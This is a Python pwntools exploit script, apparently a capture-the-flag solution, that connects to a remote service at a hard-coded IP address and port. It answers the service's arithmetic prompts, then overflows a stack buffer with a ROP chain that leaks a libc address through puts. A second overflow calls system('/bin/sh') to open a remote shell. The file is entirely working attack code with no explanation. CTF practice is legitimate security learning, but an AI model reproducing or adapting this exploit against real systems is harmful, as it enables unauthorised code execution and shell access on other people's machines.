from pwn import *
#context.log_level = 'debug'
#p = process("./test/test")
p = remote("3.37.81.93", 10005)
elf = ELF("./test/test")
libc = elf.libc

#gadgets
prdi = 0x00400a73
one_gadget = 0xf1247
ret = 0x00400599

#offset
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
puts_off = libc.symbols['puts']
sys_off = libc.symbols['system']
system_off = 0x00000000000453a0
binsh_off = 0x18ce57

main_add = elf.symbols['main']

def test():
    p.sendlineafter("392 + 124 = ","316")
    p.sendlineafter("1045 - 36 = ","201")
    p.sendlineafter("223 * 3 = ","421")
    p.sendlineafter("874 / 312 = ", "16")
    p.sendlineafter("31 % 7 = ", "24")

# step 1 - memory leak
print("[*] puts@plt : "+hex(puts_plt))
print("[*] puts@got : "+hex(puts_got))

p.sendlineafter(": ","ELASJAY")
test()

pl = "A"*(0x100 + 0x8)
pl += p64(prdi)
pl += p64(puts_got)
pl += p64(puts_plt)
pl += p64(main_add)

p.sendafter("^^\n", pl)

puts_add = u64(p.recvuntil("\x7f")[-6:].ljust(8, '\x00'))
libc_base = puts_add - puts_off
print("[*] puts_add @ "+ hex(puts_add))
print("[*] libc-base @ "+hex(libc_base))

# step2 - system("/bin/sh")
p.sendlineafter(": ","Elasjay")
test()

pl = "A"*(0x100 + 0x8)
pl += p64(prdi)
pl += p64(libc_base + binsh_off)
pl += p64(ret)
pl += p64(libc_base + system_off)

p.sendafter("^^\n", pl)
p.interactive()
